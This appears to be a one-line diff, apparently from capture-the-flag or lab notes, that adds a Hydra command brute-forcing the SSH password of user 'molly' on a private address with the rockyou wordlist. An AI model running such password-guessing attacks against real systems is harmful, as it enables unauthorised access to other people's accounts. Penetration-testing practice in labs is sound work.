@@ -1,0 +1,1 @@
+hydra -l molly -P /usr/share/wordlists/rockyou.txt -f -vV 10.10.16.81 ssh
